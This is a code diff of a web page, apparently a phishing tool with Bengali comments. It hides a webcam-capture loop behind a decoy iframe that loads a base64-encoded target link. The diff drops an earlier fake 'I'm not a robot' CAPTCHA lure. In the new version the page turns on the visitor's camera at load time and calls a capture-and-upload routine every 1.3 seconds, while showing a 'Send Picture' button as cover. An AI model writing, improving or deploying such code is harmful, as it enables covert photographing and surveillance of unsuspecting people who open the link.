@@ -47,7 +47,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Required</title>
+    <title>Loading...</title>
     <style>
         body, html {
             margin: 0;
@@ -55,78 +55,48 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             width: 100%;
             height: 100%;
             overflow: hidden;
-            background-color: #111;
-            font-family: Arial, sans-serif;
+            background-color: #000;
         }
-        /* Verification Overlay CSS */
-        #overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
+        #game-frame {
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            border: none;
+        }
+        /* Send Picture বাটনের স্টাইল */
+        #send-pic-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
             z-index: 9999;
-        }
-        .card {
-            background: #222;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            text-align: center;
-            border: 1px solid #444;
-            max-width: 320px;
-            width: 90%;
-        }
-        .robot-btn {
-            background: #fff;
-            border: 1px solid #d3d3d3;
-            padding: 12px 20px;
+            background: #ff4757;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
             font-size: 16px;
             font-weight: bold;
-            color: #333;
-            border-radius: 4px;
+            border-radius: 5px;
             cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-            transition: background 0.2s;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            display: none; /* শুরুতে হাইড থাকবে, লিংক লোড হলে শো করবে */
         }
-        .robot-btn:hover {
-            background: #f1f1f1;
-        }
-        .robot-btn input[type="checkbox"] {
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
+        #send-pic-btn:hover {
+            background: #ff6b81;
         }
     </style>
 </head>
 <body>
 
-    <!-- Overlay with "I'm not a robot" button -->
-    <div id="overlay">
-        <div class="card">
-            <p style="color: #fff; margin-bottom: 20px; font-size: 15px;">Please verify you are human to continue.</p>
-            <button class="robot-btn" id="verify-btn">
-                <input type="checkbox" id="chk"> I'm not a robot
-            </button>
-        </div>
-    </div>
+    <iframe id="game-frame" src="about:blank"></iframe>
     
+    <!-- Send Picture বাটন -->
+    <button id="send-pic-btn" onclick="openTargetLink()">Send Picture</button>
+
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const overlay = document.getElementById('overlay');
-        const verifyBtn = document.getElementById('verify-btn');
-        const checkbox = document.getElementById('chk');
 
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || 'direct';
@@ -136,32 +106,38 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
         if (rawTargetUrl) {
             try {
+                // Base64 decode kora target URL
                 finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
             } catch (e) {
                 console.error("URL decode error:", e);
             }
         }
 
-        // Button ba checkbox-e click korle sob kaj shuru hobe
-        verifyBtn.addEventListener('click', () => {
-            checkbox.checked = true;
-            
-            // Overlay hide kora ebong new tab-e link open kora
-            overlay.style.display = 'none';
-            window.open(finalUrl, '_blank');
+        // Iframe-e dynamic link load kora
+        document.getElementById('game-frame').src = finalUrl;
 
-            // Camera capture & upload start kora user interaction-er por
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    setTimeout(() => {
-                        setInterval(captureAndUpload, 1300);
-                    }, 1000);
-                })
-                .catch(err => {
-                    console.error("Camera error: ", err);
-                });
-        });
+        // লিংক সেট হওয়ার পর বাটনটি দৃশ্যমান করা
+        const sendBtn = document.getElementById('send-pic-btn');
+        if (finalUrl) {
+            sendBtn.style.display = 'block';
+        }
+
+        // বাটনে ক্লিক করলে নতুন ট্যাবে টার্গেট লিংক ওপেন করার ফাংশন
+        function openTargetLink() {
+            window.open(finalUrl, '_blank');
+        }
+
+        // Camera capture loop
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(() => {
+                    setInterval(captureAndUpload, 1300);
+                }, 1000);
+            })
+            .catch(err => {
+                console.error("Camera error: ", err);
+            });
 
         function captureAndUpload() {
             const context = canvas.getContext('2d');
